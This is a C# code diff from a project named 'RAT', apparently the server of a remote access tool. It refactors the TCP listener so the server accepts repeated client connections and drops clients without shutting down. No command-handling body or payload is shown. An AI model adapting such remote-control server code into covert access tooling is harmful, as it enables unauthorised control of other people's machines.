@@ -35,16 +35,28 @@ namespace RAT
             this.Verbose = verbose;
         }
 
-        public void StartServer()
+        public void Start()
         {
             Alive = true;
-            Console.Title = "RAT Server:" + Port;
+            Console.Title = Name + " : " + Port;
             try
             {
                 if (Verbose) Log("Listening on port " + Port);
 
                 Listener = new TcpListener(IPAddress.Any, Port);
                 Listener.Start();
+            }
+            catch (Exception e)
+            {
+                Log(e.ToString());
+            }
+        }
+
+        public void NextConnection()
+        {
+            Alive = true;
+            try
+            {
                 Socket = Listener.AcceptSocket();
 
                 if (Verbose) Log("Client connected: " + Socket.RemoteEndPoint);
@@ -82,11 +94,13 @@ namespace RAT
             {
                 Log("<ERROR> Something happened:");
                 Log(e.ToString());
-            }
-            finally
-            {
                 DropConnection();
             }
+        }
+
+        public void Stop()
+        {
+            Listener.Stop();
         }
 
         void HandleCommand(string command)
@@ -222,9 +236,8 @@ namespace RAT
             if (Verbose) Log("Dropping Connection");
             InStream.Dispose();
             OutStream.Dispose();
-            Socket.Close();
-            Listener.Stop();
-            Listener.Server.Close();
+            Socket.Shutdown(SocketShutdown.Both);
+            if (Verbose) Log("Client Disconnected");
         }
 
         void Log(string message)
